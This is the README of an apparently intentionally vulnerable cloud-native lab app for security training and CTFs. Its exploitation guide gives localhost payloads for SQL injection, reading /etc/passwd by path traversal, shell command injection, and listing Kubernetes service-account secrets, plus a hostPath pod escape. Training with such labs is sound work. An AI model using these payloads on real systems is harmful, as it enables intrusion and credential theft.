# Vulnerable Cloud-Native Labs got DevSecops 🚀

Vulnerable Code For Security Engineering &amp; Security Championship Training

**Original Code [peachycloudsecurity/vulnerable-demo-app](https://github.com/peachycloudsecurity/vulnerable-demo-app)**

This repository contains multi-language applications (Go & Python) built to demonstrate **OWASP Kubernetes Top 10 (2025)** risks and common web vulnerabilities. It is intended for security research, CTFs, and DevSecOps training.

---

## 📁 Project 
* **vulnerable-python-app/**: Python implementation focusing on Command Injection and K8s environment leaks.

---

## 🛠 Features (Across All Apps)
* **Built-in Logging:** Real-time tracking of Method, Path, Timestamp, and Remote IP for auditing.
* **Health Checks:** Includes `/healthz` and `/readyz` endpoints for Kubernetes probes.
* **K8s Focused:** Specifically crafted to test Pod escapes (HostPath) and Lateral Movement.

---

## 🚀 Quick Start

### 1. Run with Docker
`

**Python App:**
```bash
docker pull peachycloudsecurity/vulnerable-python-app:latest
docker run -p 8081:8080 peachycloudsecurity/vulnerable-python-app:latest
```

## 🛡️ Vulnerability Lab (Exploitation Guide)

### 1. SQL Injection (Go App)
**Endpoint:** `/db?id=`
* **Exploit:** `curl "http://localhost:8080/db?id=1+OR+1=1"`
* **Exfiltration:** `curl "http://localhost:8080/db?id=1+UNION+SELECT+secret+FROM+users"`

### 2. Path Traversal & Host Escape (Go & Python)
**Endpoint:** `/config?source=` (Go) | `/mnt/host/` (Exploit Pod)
* **Exploit:** `curl "http://localhost:8080/config?source=/etc/passwd"`
* **K8s Escape:** Read host files via `vulnerable-exploit-pod` mounted at `/mnt/host`.

### 3. Command Injection (Python & Go)
**Endpoint:** `/ping` (Python - UI) | `/exec?run=` (Go)
* **Python Exploit:** Input `127.0.0.1; whoami; id` in the Ping utility.
* **Go Exploit:** `curl "http://localhost:8080/exec?run=ls+/var/run/secrets/kubernetes.io/serviceaccount/"`
